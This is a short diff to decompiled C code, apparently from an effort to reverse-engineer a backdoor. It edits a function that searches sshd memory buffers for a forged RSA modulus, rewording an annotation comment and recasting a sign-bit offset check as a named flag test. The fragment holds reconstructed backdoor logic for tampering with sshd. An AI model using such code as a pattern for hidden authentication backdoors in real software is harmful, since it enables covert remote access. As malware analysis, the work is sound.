@@ -50,8 +50,8 @@ BOOL sshd_find_forged_modulus_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
       size_index = (ctx->sshd_offsets).bytes.sshbuf_size_qword_index;
       data_index = (ctx->sshd_offsets).bytes.sshbuf_data_qword_index;
       pkex_entry_span = 0x48;
-      // AutoDoc: When both qword indices are known, derive byte offsets so the later field probes land on the remapped struct layout.
-      if (-1 < (char)(data_index & size_index)) {
+      // AutoDoc: When neither qword index carries the sign-bit sentinel, derive byte offsets so the later field probes land on the remapped struct layout.
+      if (((data_index & size_index) & SSHD_OFFSET_INDEX_INLINE_FLAG) == 0) {
         size_field_offset = (ulong)((int)(char)size_index << 3);
         data_field_offset = (ulong)((int)(char)data_index << 3);
         pkex_entry_span = size_field_offset + 8;
